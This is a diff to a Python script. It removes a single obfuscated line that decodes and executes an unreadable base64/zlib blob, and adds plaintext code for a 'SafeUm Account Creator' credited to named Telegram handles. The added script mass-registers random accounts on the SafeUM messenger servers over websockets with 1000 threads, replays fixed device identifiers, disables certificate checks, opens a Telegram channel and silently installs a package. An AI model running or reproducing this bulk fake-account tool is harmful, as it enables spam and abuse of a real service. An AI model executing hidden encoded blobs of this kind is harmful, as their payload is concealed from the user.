@@ -1,1 +1,101 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import requests
+import os
+import time
+import sys
+import webbrowser
+from fake_useragent import UserAgent
+
+
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+F = '\033[1;32m'  # Ã˜Â§Ã˜Â®Ã˜Â¶Ã˜Â±
+B = "\033[1;30m"  # Black
+R = "\033[1;31m"  # Red
+G = "\033[1;32m"  # Green
+Y = "\033[1;33m"  # Yellow
+Bl = "\033[1;34m"  # Blue
+P = "\033[1;35m"  # Purple
+C = "\033[1;36m"  # Cyan
+W = "\033[1;37m"  # White
+PN = "\033[1;35m"  # PINK
+
+def to(s):
+    for char in s + "\n":
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(23.0 / 8000)
+
+to(
+    f"""{G}|{C}=============================================={G}|
+{G}| Creator        : @Haxkx & @toxic_tanji {G}         |
+{G}| {Y}Tools       :  SafeUm Account Creator Updated       {G}   |
+{G}| {PN}Expire     :  LIFETIME {G}          |
+{G}| {W}Owner      :  @tanjiro_0503 @Haxkx |
+{G}|{C}=============================================={G}|"""
+)
+
+import requests, random, requests, json, pyfiglet,sys,time, os, uuid, webbrowser
+
+Ab='\033[1;92m'
+aB='\033[1;91m'
+AB='\033[1;96m'
+aBbs='\033[1;93m'
+AbBs='\033[1;95m'
+A_bSa = '\033[1;31m'
+a_bSa = '\033[1;32m'
+faB_s = '\033[2;32m'
+a_aB_s = '\033[2;39m'
+Ba_bS = '\033[2;36m'
+Ya_Bs = '\033[1;34m'
+S_aBs = '\033[1;33m'
+ab = pyfiglet.figlet_format("Haxkx")
+print(a_bSa+ab)
+def slow(T): 
+	for r in T + '\n' :
+	    sys.stdout.write(r)
+	    sys.stdout.flush()
+	    time.sleep(30/2000)
+
+slow(S_aBs+"""âŒ¯ Welcome To Haxkx Safeum Account Creater  ðŸ’˜.
+---------------------------------------------------
+""")
+webbrowser.open("https://t.me/haxkx")
+from os import system,name
+from ssl import CERT_NONE
+from gzip import decompress
+from random import choice,choices
+from concurrent.futures import ThreadPoolExecutor
+from json import dumps
+try:
+	from websocket import create_connection
+except:
+	system('pip install websocket-client')
+	from websocket import create_connection
+
+failed = 0
+success = 0
+retry = 0
+accounts = []
+def work():
+	global failed,success,retry
+	username = choice('qwertyuioplkjhgfdsazxcvbnm') + ''.join(choices(list('qwertyuioplkjhgfdsazxcvbnm1234567890'), k=12))
+	try:
+		con = create_connection("wss://193.200.173.45/Auth", header={"app": "com.safeum.android","host": None,"remoteIp": "193.200.173.45","remotePort": str(8080),"sessionId": "b6cbb22d-06ca-41ff-8fda-c0ddeb148195","time": "2023-04-30 12:13:32","url": "wss://51.79.208.190/Auth"},sslopt={"cert_reqs": CERT_NONE})
+		con.send(dumps({"action":"Register","subaction":"Desktop","locale":"en_IN","gmt":"+05","password":{"m1x":"0041211f085f41fd8f54fa31d143dbd5e667852fe3464dc7f3e87e690c34b60a","m1y":"a9b5fdd814bfd1911b2c5c9e33b4893fce6ebadb79167d8061117d42212e0861","m2":"d50ceeb76c61694191f3949d4a9b36e2580cda6d347b567aadebd4010c79a590","iv":"4c62a6e3671c237a85822fd70aacc0b5","message":"44196cc12b128049c065446b718e4a9f5d05692c7a1e73598a9742e837b44d3368bbefb10481a9a6a96db6f4a1ed92fa2da5dcd5e5509b675ebf7a3cea7ecdc58259b9eae540b8439802a3d6f21d721e"},"magicword":{"m1x":"24c73a89c085b08eb368ca8e71c48b5911dccf9acacd1020053977141c2544e7","m1y":"af9242eaf65beeb119f461fcbced6ec052a2b6dbdf8f99eb6b3d36e580919f8c","m2":"5b3005f7c235b80232d72960bc10429e2a4493287af3561dcb6d80e198806f9c","iv":"16bc901405c8b4cd0da1646fd0f5a6df","message":"097d09edbfc3e3ced1a6a35d9e52f72e"},"magicwordhint":"0000","login":str(username),"devicename":"Xiaomi 220733SPH","softwareversion":"1.1.0.1640","nickname":"uzrurzrizirz","os":"AND","deviceuid":"b0c55c7c17fddd4b","devicepushuid":"*eL-cSO7HSqWTPH08tbDvrT:APA91bEsZSuqtqy6-F2hDOsB17-Sght-cXJxc091gLZwtkQaQI_vTpYkBJWip4UsQSNveMUVIWMguiW48dFzakUf9BwCCq7dZbadcBvWSPXcLKXt7DQ4_IivMKC36CiORqDp8yT52Y1C","osversion":"and_12.0.0","id":"1177898800"}))
+		gzip = decompress(con.recv()).decode('utf-8')
+		if '"status":"Success"' in gzip:
+			success+= 1
+			accounts.append(username+':@toxic_tanji')
+			with open('Haxkx.txt', 'a') as f: f.write(username + ":@toxic_tanji | TG : @Haxkx\n")
+		else:
+			failed+=1
+	except: retry+=1
+
+start = ThreadPoolExecutor(max_workers=1000)
+while True:
+    start.submit(work)
+    print('\n\n\n'+' '*25+'Success : '+str(success)+'\n\n\n'+' '*25+'Failed : '+str(failed)+'\n\n\n'+' '*25+'ReTry : '+str(retry))
+    if int(success) > int(0): print("\n Accounts :  "+"\n".join(accounts))
+    system("cls" if name=="nt" else "clear")
